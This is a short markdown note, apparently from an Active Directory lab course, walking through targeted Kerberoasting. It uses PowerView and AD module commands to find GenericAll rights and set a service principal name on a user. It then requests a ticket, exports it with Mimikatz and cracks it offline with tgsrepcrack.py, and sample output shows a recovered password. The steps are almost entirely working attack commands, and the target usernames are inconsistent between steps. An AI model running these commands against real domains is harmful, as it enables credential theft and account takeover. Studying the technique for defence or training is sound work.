# Targeted Kerberoasting - Set SPN
It doesnt matter if a normal user is an actual service, since it depends on the SPN values. This attack exploits the target user's rights to set the SPN value (to anything unqiue) making it being recognised as a service account. Then launching the attack to request TGS.

- With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain).
- We can then request a TGS without special privileges. The TGS can then be "Kerberoasted".


1. Enum permission for RDPUsers on ACL
```powershell
#using powerview_dev
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

# We are looking for ActiveDirectoryRights: GenericAll

#check if user have SPN, if not, Great!
Get-DomainUser -Identity supportuser | select serviceprincipalname

#or check using AD Module
Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
```

2. Set a SPN for the user (must be unique for the domain)
```powershell
Set-DomainObject -Identity support133user -Set @{ServicePrincipalName='ops/whatever1'} -Verbose

#AD Module
Set-ADUser -Identity support1user -ServicePrincipalNames
@{Add='ops/whatever1'}


# Now we can check if three is a SPN set 
Get-DomainUser -Identity supportuser | select serviceprincipalname
```

3. Request a ticket and save it offline for bruteforcing
```powershell
Add-Type -AssemblyNAme System.IdentityModel 

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"

#check if ticket granted
klist

#..
##3>     Client: student133 @ DOLLARCORP.MONEYCORP.LOCAL
#        Server: ops/whatever1 @ DOLLARCORP.MONEYCORP.LOCAL
#        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
#..


#export tickets
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

4. crack the passsword
```powershell
python.exe .\tgsrepcrack.py .\10k-passwords.txt '.\2-dollarcorp.moneycorp.LOCAL.kirbi'

# found password for ticket 0: Support@123 File: .\2-40a10000-
# studentx@dcorp~whateverX-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```